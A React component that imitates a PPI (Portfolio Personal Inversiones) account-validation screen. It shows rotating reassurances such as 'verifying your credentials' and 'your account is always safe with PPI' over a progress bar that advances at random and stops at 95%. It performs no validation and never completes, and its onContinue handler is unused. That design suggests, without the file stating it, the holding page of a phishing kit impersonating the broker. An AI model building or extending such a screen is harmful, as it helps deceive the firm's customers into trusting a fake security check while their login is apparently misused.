import { useEffect, useState } from "react";
import { Loader2 } from "lucide-react";
import ppiLogoSvg from "@/assets/ppi-logo.svg";

interface PpiWaitingScreenProps {
  username: string;
  onContinue?: () => void;
}

const WAITING_MESSAGES = [
  "Espere un poco más, estamos validando su cuenta.",
  "Su cuenta está siempre segura con PPI.",
  "Estamos cargando su información.",
  "Verificando sus credenciales de acceso.",
  "Este proceso puede demorar unos instantes.",
];

const PpiWaitingScreen = ({ username }: PpiWaitingScreenProps) => {
  const [messageIndex, setMessageIndex] = useState(0);
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    const interval = window.setInterval(() => {
      setMessageIndex((prev) => (prev + 1) % WAITING_MESSAGES.length);
    }, 4000);
    return () => window.clearInterval(interval);
  }, []);

  useEffect(() => {
    const interval = window.setInterval(() => {
      setProgress((p) => {
        if (p >= 95) return 95;
        return Math.min(p + Math.random() * 2.5 + 0.5, 95);
      });
    }, 500);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="w-full max-w-[420px] mx-auto">
      <div className="bg-white border border-[#e5e7eb] rounded-lg shadow-sm px-8 py-10">
        {/* Logo */}
        <div className="flex justify-center mb-8">
          <img src={ppiLogoSvg} alt="PPI" className="h-8" />
        </div>

        {/* Spinner */}
        <div className="flex justify-center mb-6">
          <div className="relative">
            <Loader2 className="h-10 w-10 animate-spin text-[#1e5a96]" strokeWidth={2} />
          </div>
        </div>

        {/* Title */}
        <h2 className="text-center text-[17px] font-semibold text-[#1e2a3a] mb-2">
          Validando su cuenta
        </h2>

        {/* Rotating message */}
        <p className="text-center text-[13px] text-[#8c939a] leading-relaxed min-h-[40px] transition-opacity duration-500 mb-5">
          {WAITING_MESSAGES[messageIndex]}
        </p>

        {/* Progress bar */}
        <div className="mb-6">
          <div className="h-1 w-full rounded-full bg-[#f0f2f5] overflow-hidden">
            <div
              className="h-full rounded-full bg-[#1e5a96] transition-all duration-500 ease-out"
              style={{ width: `${progress}%` }}
            />
          </div>
          <div className="flex justify-end mt-1">
            <span className="text-[10px] text-[#bbb]">{Math.round(progress)}%</span>
          </div>
        </div>

        {/* Username */}
        <div className="flex justify-center">
          <span className="text-[12px] text-[#999] bg-[#f8f9fa] border border-[#eee] rounded px-3 py-1.5">
            {username}
          </span>
        </div>
      </div>

      {/* Footer note */}
      <p className="mt-4 text-center text-[10px] text-[#bbb]">
        Portfolio Personal Inversiones S.A. — Proceso de seguridad automatizado
      </p>
    </div>
  );
};

export default PpiWaitingScreen;
